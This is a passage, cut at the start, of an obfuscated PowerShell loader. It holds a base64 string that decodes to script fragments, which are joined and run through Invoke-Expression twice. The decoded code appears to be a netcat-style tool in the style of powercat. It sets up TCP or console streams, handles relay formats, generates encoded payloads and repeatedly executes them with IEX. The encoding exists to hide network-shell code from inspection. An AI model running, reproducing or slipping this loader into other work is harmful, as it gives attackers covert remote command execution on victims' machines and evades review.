AidGNwIicsJykKICAgIHsKICAgICAgV3InLCdpdGUtVmVyYm9zZSAiU2V0JywnIFN0cmVhbSAyOiBUQ1AiCicsJyAgICAgICRGdW5jdGlvblMnLCd0cmluZyArPSAoImZ1bmN0JywnaW9uIFN0cmVhbTJfU2V0dScsJ3BgbntgbiIgKyAke2Z1bmMnLCd0aW9uOlNldHVwX1RDUH0gJywnKyAiYG59YG5gbiIpCiAgICcsJyAgICRGdW5jdGlvblN0cmknLCduZyArPSAoImZ1bmN0aW9uJywnIFN0cmVhbTJfUmVhZERhdCcsJ2FgbntgbiIgKyAke2Z1bmMnLCd0aW9uOlJlYWREYXRhX1RDJywnUH0gKyAiYG59YG5gbiIpCicsJyAgICAgICRGdW5jdGlvblMnLCd0cmluZyArPSAoImZ1bmN0JywnaW9uIFN0cmVhbTJfV3JpdCcsJ2VEYXRhYG57YG4iICsgJHsnLCdmdW5jdGlvbjpXcml0ZURhJywndGFfVENQfSArICJgbn1gbicsJ2BuIikKICAgICAgJEZ1bmMnLCd0aW9uU3RyaW5nICs9ICgiJywnZnVuY3Rpb24gU3RyZWFtMicsJ19DbG9zZWBue2BuIiArICQnLCd7ZnVuY3Rpb246Q2xvc2VfJywnVENQfSArICJgbn1gbmBuIicsJykKICAgICAgaWYoJHIuc3AnLCdsaXQoIjoiKS5Db3VudCAtJywnZXEgMil7JEludm9rZVN0cicsJ2luZyArPSAoIkAoJycnJyxgJCcsJ1RydWUsJyciICsgJHIuc3BsJywnaXQoIjoiKVsxXSArICInJywnLCcnJyR0JycpICIpfQogICAgICAnLCdlbHNlaWYoJHIuc3BsaXQoJywnIjoiKS5Db3VudCAtZXEgMycsJyl7JEludm9rZVN0cmluZyAnLCcrPSAoIkAoJyciICsgJHIucycsJ3BsaXQoIjoiKVsxXSArICInLCcnJyxgJEZhbHNlLCcnIiArICQnLCdyLnNwbGl0KCI6IilbMl0gJywnKyAiJycsJyckdCcnKSAiKX0KICcsJyAgICAgZWxzZXtyZXR1cm4nLCcgIkJhZCByZWxheSBmb3JtJywnYXQuIn0KICAgIH0KICB9CicsJyAgZWxzZQogIHsKICAgIFcnLCdyaXRlLVZlcmJvc2UgIlNlJywndCBTdHJlYW0gMjogQ29ucycsJ29sZSIKICAgICRGdW5jdGknLCdvblN0cmluZyArPSAoImZ1JywnbmN0aW9uIFN0cmVhbTJfUycsJ2V0dXBgbntgbiIgKyAke2YnLCd1bmN0aW9uOlNldHVwX0NvJywnbnNvbGV9ICsgImBufWBuYCcsJ24iKQogICAgJEZ1bmN0aW8nLCduU3RyaW5nICs9ICgiZnVuJywnY3Rpb24gU3RyZWFtMl9SZScsJ2FkRGF0YWBue2BuIiArICQnLCd7ZnVuY3Rpb246UmVhZERhJywndGFfQ29uc29sZX0gKyAiYCcsJ259YG5gbiIpCiAgICAkRnUnLCduY3Rpb25TdHJpbmcgKz0gJywnKCJmdW5jdGlvbiBTdHJlYScsJ20yX1dyaXRlRGF0YWBue2AnLCduIiArICR7ZnVuY3Rpb246JywnV3JpdGVEYXRhX0NvbnNvbCcsJ2V9ICsgImBufWBuYG4iKQonLCcgICAgJEZ1bmN0aW9uU3RyJywnaW5nICs9ICgiZnVuY3RpbycsJ24gU3RyZWFtMl9DbG9zZWAnLCdue2BuIiArICR7ZnVuY3RpJywnb246Q2xvc2VfQ29uc29sZScsJ30gKyAiYG59YG5gbiIpCiAnLCcgICAkSW52b2tlU3RyaW5nJywnICs9ICgiQCgnJyIgKyAkbyAnLCcrICInJykiKQogIH0KICAKICcsJyBpZigkZXApeyRGdW5jdGknLCdvblN0cmluZyArPSAoImZ1JywnbmN0aW9uIE1haW5gbntgbicsJyIgKyAke2Z1bmN0aW9uOk0nLCdhaW5fUG93ZXJzaGVsbH0gJywnKyAiYG59YG5gbiIpfQogICcsJ2Vsc2V7JEZ1bmN0aW9uU3QnLCdyaW5nICs9ICgiZnVuY3RpJywnb24gTWFpbmBue2BuIiArICcsJyR7ZnVuY3Rpb246TWFpbn0nLCcgKyAiYG59YG5gbiIpfQogJywnICRJbnZva2VTdHJpbmcgPScsJyAoJEZ1bmN0aW9uU3RyaW4nLCdnICsgJEludm9rZVN0cmluJywnZykKICAjIyMjIyMjIyMjICcsJ0dFTkVSQVRFIFBBWUxPQUQnLCcgIyMjIyMjIyMjIwogIAogJywnICMjIyMjIyMjIyMgUkVUVScsJ1JOIEdFTkVSQVRFRCBQQVknLCdMT0FEUyAjIyMjIyMjIyMjJywnCiAgaWYoJGdlKXtXcml0ZScsJy1WZXJib3NlICJSZXR1cm4nLCdpbmcgRW5jb2RlZCBQYXlsJywnb2FkLi4uIiA7IHJldHVybicsJyBbQ29udmVydF06OlRvQmEnLCdzZTY0U3RyaW5nKFtTeXN0JywnZW0uVGV4dC5FbmNvZGluZycsJ106OlVuaWNvZGUuR2V0QnknLCd0ZXMoJEludm9rZVN0cmluJywnZykpfQogIGVsc2VpZigkZycsJyl7V3JpdGUtVmVyYm9zZSAnLCciUmV0dXJuaW5nIFBheWxvJywnYWQuLi4iIDsgcmV0dXJuICcsJyRJbnZva2VTdHJpbmd9CiAnLCcgIyMjIyMjIyMjIyBSRVRVJywnUk4gR0VORVJBVEVEIFBBWScsJ0xPQURTICMjIyMjIyMjIyMnLCcKICAKICAjIyMjIyMjIyMjJywnIEVYRUNVVElPTiAjIyMjIycsJyMjIyMjCiAgJE91dHB1dCAnLCc9ICRudWxsCiAgdHJ5CiAgJywnewogICAgaWYoJHJlcCkKICcsJyAgIHsKICAgICAgd2hpbGUnLCcoJFRydWUpCiAgICAgIHsKJywnICAgICAgICAkT3V0cHV0ICcsJys9IElFWCAkSW52b2tlU3QnLCdyaW5nCiAgICAgICAgU3RhJywncnQtU2xlZXAgLXMgMgogICcsJyAgICAgIFdyaXRlLVZlcmInLCdvc2UgIlJlcGV0aXRpb24gJywnRW5hYmxlZDogUmVzdGFydCcsJ2luZy4uLiIKICAgICAgfQonLCcgICAgfQogICAgZWxzZQogJywnICAgewogICAgICAkT3V0cCcsJ3V0ICs9IElFWCAkSW52b2snLCdlU3RyaW5nCiAgICB9CiAgJywnfQogIGZpbmFsbHkKICB7CicsJyAgICBpZigkT3V0cHV0IC0nLCduZSAkbnVsbCkKICAgIHsKJywnICAgICAgaWYoJG9mIC1lcScsJyAiIil7JE91dHB1dH0KICAnLCcgICAgZWxzZXtbaW8uZmlsJywnZV06OldyaXRlQWxsQnl0ZScsJ3MoJG9mLCRPdXRwdXQpfQonLCcgICAgfQogIH0KICAjIyMjJywnIyMjIyMjIEVYRUNVVElPTicsJyAjIyMjIyMjIyMjCn0KCicpOyAkc2NyaXB0ID0gJGZyYWdtZW50cyAtam9pbiAnJzsgSW52b2tlLUV4cHJlc3Npb24gJHNjcmlwdA=='); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated